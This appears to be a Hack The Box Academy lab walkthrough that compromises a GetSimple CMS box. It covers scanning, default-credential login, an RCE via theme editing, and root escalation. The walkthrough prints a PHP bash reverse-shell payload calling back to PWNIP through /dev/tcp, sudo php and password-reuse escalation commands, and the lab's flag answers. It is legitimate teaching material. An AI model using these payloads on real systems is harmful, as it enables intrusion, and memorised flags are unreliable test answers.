
---

Let's put together everything we learned in this module and attack our first box without a guide.

---

## Tips

Remember that enumeration is an iterative process. After performing our `Nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with `Nibbles`:

- Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan
    
- Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `Gobuster`
    
- If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
    
- After identifying the technologies in use, use a tool such as `Searchsploit` to find public exploits or search on Google for manual exploitation techniques
    
- After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY
    
- Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials
    
- Organize this data offline to determine the various ways to escalate privileges to root on this target
    

There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.

Have fun, never stop learning, and do not forget to `think outside of the box`!

---

# Knowledge Check

## Question 1

### "Spawn the target, gain a foothold and submit the contents of the user.txt flag."

Students need to first start their enumeration by a port scan using `Nmap`:

Code: shell

```shell
nmap -sC -sV STMIP
```

  Knowledge Check

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.163.178

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 12:59 GMT
Nmap scan report for 10.129.163.178
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 
(Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the root webpage of the web application, students will notice that the spawned target machine uses the `GetSimple` `CMS`:

![Getting_Started_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/21/Getting_Started_Walkthrough_Image_14.png)

After performing directory fuzzing, students will find the `/admin/` directory. Navigating to it, they are prompted for credentials. Before attempting brute-forcing on the login form, students should check for default/common credentials first, and they will find that `admin:admin` are used (another method to bypass the login page is by getting an API key from: `http://STMIP/data/other/authorization.xml`):

![Getting_Started_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/21/Getting_Started_Walkthrough_Image_15.png)

Once logged in, students will notice that the version of the `CMS` is `3.3.15`:

![Getting_Started_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/21/Getting_Started_Walkthrough_Image_16.png)

Version `3.3.15` and before suffer from [unauthenticated remote code execution](https://ssd-disclosure.com/ssd-advisory-getcms-unauthenticated-remote-code-execution/). To exploit this vulnerability, students can use `Metasploit` or carry out the exploit manually. For manual exploitation, students need to go to "Theme", then "Edit Theme" in the dashboard (or by navigating to `http://STMIP/admin/theme-edit.php` directly) and add a PHP reverse-shell at the beginning of the file:

Code: php

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'"); ?>
```

![Getting_Started_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/21/Getting_Started_Walkthrough_Image_17.png)

Students then need to start a listener on their `Pwnbox`/`PMVPN` using `nc`:

Code: shell

```shell
nc -nvlp PWNPO
```

  Knowledge Check

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ nc -nvlp 1234

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Subsequently, students need to visit the `/template.php` web page (`http://STMIP/theme/Innovation/template.php`) to execute the PHP reverse-shell code:

![Getting_Started_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/21/Getting_Started_Walkthrough_Image_18.png)

If performed correctly, students will receive the call back on the `nc` listener:

  Knowledge Check

```shell-session
Ncat: Connection from 10.129.42.249.
Ncat: Connection from 10.129.42.249:42840.
bash: cannot set terminal process group (1014): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gettingstarted:/var/www/html/theme/Innovation$ 
```

Students need to upgrade their dumb TTY terminal and make it interactive:

Code: shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html/theme/Innovation$ python3 -c 'import pty;pty.spawn("/bin/bash");'    
www-data@gettingstarted:/var/www/html/theme/Innovation$ export TERM=xterm
```

At last, students can read the "user.txt" flag found within the `/home/mrb3n/` directory, finding it to be `7002d65b149b0a4d19132a66feed21d8`:

Code: shell

```shell
cat /home/mrb3n/user.txt
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html/theme/Innovation$ cat /home/mrb3n/user.txt

7002d65b149b0a4d19132a66feed21d8
```

Answer: {hidden}

# Knowledge Check

## Question 2

### "After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag."

Using the same reverse-shell connection established in the previous question, many approaches can be taken to solve this question.

A first approach is whereby students check the allowed commands for the invoking user on the spawned target machine, to notice that the user `www-data` can run as `root` the `PHP` command:

Code: shell

```shell
sudo -l
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l

Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:
	/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

According to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo), this can be abused to gain an elevated shell-session shell:

Code: shell

```shell
sudo php -r "system('/bin/bash');"
whoami
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "system('/bin/bash');"
root@gettingstarted:/var/www/html/theme/Innovation\# whoami

root
```

A second approach is by running `linpeas` and noticing that the configuration file `/var/www/html/gsconfig.php` exposes the password `P@ss0rd`:

Code: shell

```shell
cat gsconfig.php
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html$ cat gsconfig.php

<SNIP>
\# Extra salt to secure your password with. 
Default is empty for backwards compatibility.
\#define('GSLOGINSALT', 'your_unique_phrase');
\#define('GSLOGINSALT', 'P@ssw0rd');
<SNIP>
```

Students then need to use this password to sign in as the user `mrb3n`, who can run as `root` all commands. Thus, students then can sign in as the user `root` and read the contents of the "root.txt" flag, finding it to be `f1fba6e9f71efb2630e6e34da6387842`:

Code: shell

```shell
su mrb3n
sudo su -
cat root.txt
```

  Knowledge Check

```shell-session
www-data@gettingstarted:/var/www/html$ su mrb3n
Password: P@ssw0rd

mrb3n@gettingstarted:/var/www/html$ sudo -l
[sudo] password for mrb3n: P@ssw0rd

Matching Defaults entries for mrb3n on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:
	/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on gettingstarted:
    (ALL : ALL) ALL
mrb3n@gettingstarted:/var/www/html$ sudo su -
root@gettingstarted:~\# cat root.txt

f1fba6e9f71efb2630e6e34da6387842
```

Answer: {hidden}